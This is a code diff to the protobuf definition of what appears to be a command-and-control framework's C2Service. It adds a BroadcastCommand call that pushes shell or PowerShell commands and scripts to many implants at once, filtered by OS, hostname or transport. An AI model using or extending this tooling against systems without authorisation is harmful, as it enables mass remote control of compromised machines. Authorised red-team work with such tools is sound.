@@ -43,6 +43,9 @@ service C2Service {
 
   // Session event streaming for real-time console notifications
   rpc SessionEventStream(SessionEventStreamRequest) returns (stream SessionEvent);
+
+  // Broadcast command to multiple sessions
+  rpc BroadcastCommand(BroadcastCommandRequest) returns (BroadcastCommandResponse);
 }
 
 // Registration Messages
@@ -526,4 +529,40 @@ message SessionEvent {
     SESSION_UPDATED = 2;     // Session information updated
     TASK_COMPLETED = 3;      // Long-running task completed
   }
+}
+
+// Broadcast command messages
+message BroadcastFilter {
+  string os = 1;                    // "windows", "linux", "darwin"
+  string hostname_pattern = 2;      // Regex pattern
+  string transport = 3;             // "HTTP", "HTTPS", "mTLS"
+}
+
+message BroadcastCommandRequest {
+  BroadcastFilter filter = 1;
+  string command = 2;
+  CommandMessage.CommandType type = 3;  // Must be SHELL or POWERSHELL
+  int32 timeout_seconds = 4;
+  bool is_script = 5;                   // If true, write to temp file and execute
+  string script_extension = 6;          // File extension for script (e.g., "sh", "ps1", "bat")
+}
+
+message BroadcastSessionResult {
+  string implant_id = 1;
+  string codename = 2;
+  string hostname = 3;
+  string status = 4;      // "sent", "queued", "completed", "failed"
+  string command_id = 5;
+  string output = 6;      // Truncated output
+  string error = 7;
+}
+
+message BroadcastCommandResponse {
+  bool success = 1;
+  string message = 2;
+  string broadcast_id = 3;
+  int32 total_sessions = 4;
+  int32 commands_sent = 5;
+  int32 commands_failed = 6;
+  repeated BroadcastSessionResult results = 7;
 }
